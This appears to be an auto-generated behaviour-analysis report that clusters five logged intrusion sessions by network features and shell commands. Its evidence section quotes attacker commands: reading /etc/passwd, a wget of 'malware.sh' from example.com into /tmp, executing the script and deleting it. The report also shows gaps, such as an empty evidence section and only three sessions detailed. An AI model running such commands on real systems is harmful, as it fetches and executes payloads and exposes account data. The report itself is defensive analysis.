# Behaviour Pattern Analysis Report

- Total DEC sessions analysed: 5
- Valid cluster assignments: 5
- Missing/invalid cluster assignments: 0
- Duplicate DEC session IDs: 0
- Unmatched DEC-to-mapping sessions: 0
- Sessions without session-details record: 0

## Cluster distribution

| Cluster ID | Session Count | Percentage |
|---|---:|---:|
| 1.0 | 5 | 100.00% |

## Cluster characteristics

### Cluster 1
- Session count: 5
- Percentage of sessions: 100.00%
- Dominant behavioural interpretation: Mixed/Unclassified
- Key distinguishing features: tcprtt=0.042; synack=0.019; sttl=64.000; spkts=4.600; sload=257.045
- Top command categories: reconnaissance (16); file_system (8); file_transfer (3); networking (3); credential_attack (2)

## Command and activity evidence

### Cluster 1

## Evidence-backed behavioural interpretation

### Cluster 1
- Most common interpretation: Mixed/Unclassified (2 sessions)
- Session 8bc90eb81f6a: Mixed/Unclassified — Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.314849
- Session 6a0b14ea5061: Download or payload retrieval — Observed commands: cd /tmp, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 4.444169
- Session 032b5c63590e: Persistence-related activity — Observed commands: ./malware.sh, <!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content="width=device-width,initial-scale=1"><title>Example Domain</title><style>html{color-scheme:light dark;background:light-dark(#eee,#222)}body{font:16px/1.6 system-ui,sans-serif;max-width:26em;margin:auto;padding:25vh 2em 2em;text-align:center}</style></head><body><p>This domain is for use in documentation examples without needing permission. This is not a service; avoid relying on it for testing and monitoring purposes.</p><script src=/s.js></script></body></html>, cd /tmp, exit, rm malware.sh; Command categories: evasion, file_system, file_transfer, networking, persistence, reconnaissance; Authentication success flag: 1; Session duration: 4.960177

## Ambiguities and limitations

- Cluster IDs are mathematical group labels, not attack labels.
- Interpretation is limited to fields present in the repository data and to the evidence available in session metadata.
- If a cluster lacks reliable command or auth evidence, it is reported as Mixed/Unclassified or Insufficient Evidence.
- Some session records may be absent from session_details.json or mapping files; these are tracked explicitly in validation output.

